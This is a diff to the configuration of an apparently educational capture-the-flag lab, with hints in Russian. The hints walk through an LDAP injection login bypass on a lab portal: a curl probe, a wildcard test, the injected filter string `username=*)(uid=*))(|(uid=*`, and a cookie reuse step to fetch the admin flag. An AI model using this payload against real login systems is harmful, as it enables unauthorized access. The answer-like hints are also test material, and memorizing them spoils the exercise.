@@ -21,6 +21,7 @@ lab:
   files: [task.md]
   check: 'grep -q ''nto{'' found.txt'
   hints:
+    - "Повторение (`web-nosql-ldap-xpath`): фильтр = скобочное выражение; сначала `curl -s -X POST http://portal.corp.local/login --data 'username=alice&password=wrong'`."
     - 'Проверь wildcard: `username=*` меняет ошибку с «invalid credentials» на «invalid password».'
     - 'Обход: закрой условие и добавь ветку ИЛИ: `username=*)(uid=*))(|(uid=*`.'
     - 'Сохрани cookie: `-c cookies.txt`, затем запроси `-b cookies.txt http://portal.corp.local/admin/flag`.'
